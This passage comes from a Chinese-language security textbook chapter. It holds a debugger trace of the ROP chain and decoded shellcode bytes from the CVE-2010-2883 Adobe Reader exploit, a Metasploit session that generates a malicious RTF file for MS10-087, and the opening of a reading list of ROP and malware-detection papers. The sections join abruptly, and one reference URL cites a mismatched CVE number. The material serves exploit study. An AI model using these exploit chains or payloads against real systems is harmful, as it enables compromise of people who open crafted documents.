4A842DB2 97 xchg eax,edi
4A842DB3 C3 retn ; esp
= 0C0C0D00, eip = 4A802AB1
4A802AB1 5B pop ebx ; esp
= 0C0C0D04, ebx = 00000020
4A802AB2 C3 retn ; esp
= 0C0C0D08, eip = 4A80A8A6
4A80A8A6 213C5C and dword ptr ss:[esp
+ebx*2],edi
...
4A80A8C8 32C0 xor al,al
4A80A8CA C3 retn ; esp
= 0C0C0D0C, eip = 4A8063A5
4A8063A5 59 pop ecx ; esp
= 0C0C0D10, ecx = 4A801064
4A8063A6 C3 retn ; esp
= 0C0C0D14, eip = 4A80AEDC
1651
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
4A80AEDC 8D5424 0C lea edx,dword ptr ss:
[esp+0xC] ; edx = 0C0C0D20
4A80AEE0 52 push edx
4A80AEE1 50 push eax
4A80AEE2 FF7424 0C push dword ptr ss:[es
p+0xC]
4A80AEE6 FF35 3C098A4A push dword ptr ds:[0x
4A8A093C]
4A80AEEC FFD1 call ecx ; esp
= 0C0C0D00, eip = 4A801064
4A80AEEE 83C4 10 add esp,0x10
4A80AEF1 C3 retn
4A801064 C3 retn ; esp
= 0C0C0D04, eip = 4A80AEEE
4A80AEEE 83C4 10 add esp,0x10
4A80AEF1 C3 retn ; esp
= 0C0C0D18, eip = 4A801F90
4A801F90 58 pop eax ; eax
= 00000034
4A801F91 C3 retn ; esp
= 0C0C0D20, eip = 4A80D585
4A80D585 03C2 add eax,edx ; eax
= 0C0C0D54
4A80D587 C3 retn ; esp
= 0C0C0D24, eip = 4A8063A5
1652
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
4A8063A5 59 pop ecx ; ecx
= 4A801064
4A8063A6 C3 retn ; esp
= 0C0C0D2C, eip = 4A842DB2
4A842DB2 97 xchg eax,edi
4A842DB3 C3 retn ; esp
= 0C0C0D30, eip = 4A802AB1
4A802AB1 5B pop ebx ; ebx
= 0000000A
4A802AB2 C3 retn ; esp
= 0C0C0D38, eip = 4A80A8A6
4A80A8A6 213C5C and dword ptr ss:[esp
+ebx*2],edi
...
4A80A8C8 32C0 xor al,al
4A80A8CA C3 retn ; esp
= 0C0C0D3C, eip = 4A801F90
4A801F90 58 pop eax ; eax
= 4A849170 
4A801F91 C3 retn ; esp
= 0C0C0D44, eip = 4A80B692
1653
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
4A80B692 - FF20 jmp dword ptr ds:[eax
] ; msvcr80.memcpy
调用函数 memcpy ，各参数如下所示：
0C0C0D44 03E90000 /CALL 到 memcpy
0C0C0D48 03E90000 |dest = 03E90000
0C0C0D4C 0C0C0D54 |src = 0C0C0D54
0C0C0D50 00001000 \n = 1000 (4096.)
然后这段复制过去的 shellcode 会被解密，并跳到
03E900A3 执行：
03E9000E B1 31 mov cl,0x31
03E90010 315A 18 xor dword ptr ds:[edx
+0x18],ebx
03E90013 035A 18 add ebx,dword ptr ds:
[edx+0x18]
03E90016 83C2 04 add edx,0x4
03E90019 ^ E2 F5 loopd short 03E90010
03E9001B FC cld
03E9001C E8 82000000 call 03E900A3
1654
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
d 03E90000:
03E90000 DB C1 D9 74 24 F4 BB 81 F4 49 9E 5A 29
C9 B1 31 哿贤$艋侓I澛)杀1
03E90010 31 5A 18 03 5A 18 83 C2 04 E2 F5 FC E8
82 00 00 1ZZ兟怩?.
03E90020 00 60 89 E5 31 C0 64 8B 50 30 8B 52 0C
8B 52 14 .`夊1纃婸0婻.婻
03E90030 8B 72 28 0F B7 4A 26 31 FF AC 3C 61 7C
02 2C 20 媟(稪&1 ?a|,
03E90040 C1 CF 0D 01 C7 E2 F2 52 57 8B 52 10 8B
4A 3C 8B 料.氢骔W婻婮 search cve-2010-3333
Name Discl
osure Date Rank Description
---- -----
---------- ---- -----------
exploit/windows/fileformat/ms10_087_rtf_pfragments_bof 2010-
11-09 great MS10-087 Microsoft Word RTF pFragments Stack
Buffer Overflow (File Format)
msf > use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) > sh
ow info
msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) > se
t target 6
target => 6
msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) > se
t filename cve20103333.rtf
filename => cve20103333.rtf
msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) > ex
ploit
[*] Creating 'cve20103333.rtf' file ...
[+] cve20103333.rtf stored at /home/firmy/.msf4/local/cve2010333
3.rtf
漏洞分析
参考资料
https://www.cvedetails.com/cve/CVE-2010-2333
1661
八、学术篇
第八章 学术篇
论文下载： 链接：https://pan.baidu.com/s/1G-WFCzAU2VdrrsHqJzjGpw 密码：
vhfw
8.1 The Geometry of Innocent Flesh on the Bone: Return-into-libc without
Function Calls (on the x86)
8.2 Return-Oriented Programming without Returns
8.3 Return-Oriented Rootkits: Bypassing Kernel Code Integrity Protection
Mechanisms
8.4 ROPdefender: A Detection Tool to Defend Against Return-Oriented
Programming Attacks
8.5 Data-Oriented Programming: On the Expressiveness of Non-Control Data
Attacks
8.6 Hacking Blind
8.7 What Cannot Be Read, Cannot Be Leveraged? Revisiting Assumptions of
JIT-ROP Defenses
8.8 All You Ever Wanted to Know About Dynamic Taint Analysis and Forward
Symbolic Execution (but might have been afraid to ask)
8.9 Symbolic Execution for Software Testing: Three Decades Later
8.10 AEG: Automatic Exploit Generation
8.11 Address Space Layout Permutation (ASLP): Towards Fine-Grained
Randomization of Commodity Software
8.12 ASLR on the Line: Practical Cache Attacks on the MMU
8.13 New Frontiers of Reverse Engineering
8.14 Who Allocated My Memory? Detecting Custom Memory Allocators in C
Binaries
8.15 EMULATOR vs REAL PHONE: Android Malware Detection Using
Machine Learning
8.16 DynaLog: An automated dynamic analysis framework for characterizing
Android applications
8.17 A Static Android Malware Detection Based on Actual Used Permissions
Combination and API Calls
8.18 MaMaDroid: Detecting Android malware by building Markov chains of
behavioral models
1662
八、学术篇
8.19 DroidNative: Semantic-Based Detection of Android Native Code
Malware
8.20 DroidAnalytics: A Signature Based Analytic System to Collect, Extract,